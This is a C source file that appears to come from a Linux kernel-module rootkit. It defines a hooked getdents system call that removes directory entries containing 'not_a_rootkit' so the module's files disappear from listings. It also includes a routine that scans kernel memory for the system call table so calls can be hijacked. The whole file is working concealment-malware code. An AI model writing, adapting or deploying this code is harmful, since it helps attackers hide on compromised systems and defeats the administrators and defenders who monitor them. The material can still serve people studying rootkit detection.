
#include <hooking.h>

/* our new getdents function */
asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count) {

	/* run the original function, then remove any entries we want */
	long ret = sys_getdents_original(fd, dirent, count);
	if (ret <= 0) {
		return ret;
	}

	char *dir_ref = (char *)dirent;
	int offset = 0;
	while (offset < ret) {
		//char *entry_addr = dir_ref + offset;
		struct linux_dirent64 *cur_entry = (struct linux_dirent64 *)(dir_ref + offset);

		/* search for any occurance of our module */
		if (strstr(cur_entry->d_name, "not_a_rootkit") != NULL) {
			/* copy over the entry with all entries after it */
			//char *entry_end = dir_ref + offset + cur_entry->d_reclen;

			/* size to copy will be everything after this entry */
			//size_t len = ret - (offset + cur_entry->d_reclen);

			memcpy(dir_ref + offset, dir_ref + offset + cur_entry->d_reclen, ret - (offset + cur_entry->d_reclen));

			/* adjust length reported */
			ret -= cur_entry->d_reclen;
		} else {
			offset += cur_entry->d_reclen;
		}
		/* if we do remove an entry, offset will be pointing at new entry to examine */
	}

	return ret;
}

#define START_SEARCH PAGE_OFFSET
#define END_SEARCH ULONG_MAX
unsigned long *find_syscall_table (void) {
	unsigned long i;
	unsigned long *syscall_table;
	unsigned long sys_open_addr = kallsyms_lookup_name("sys_open");
	for (i = START_SEARCH; i < END_SEARCH; i+= sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_open] == (unsigned long)sys_open_addr) {
			return syscall_table;
		}
	}
	return NULL;
}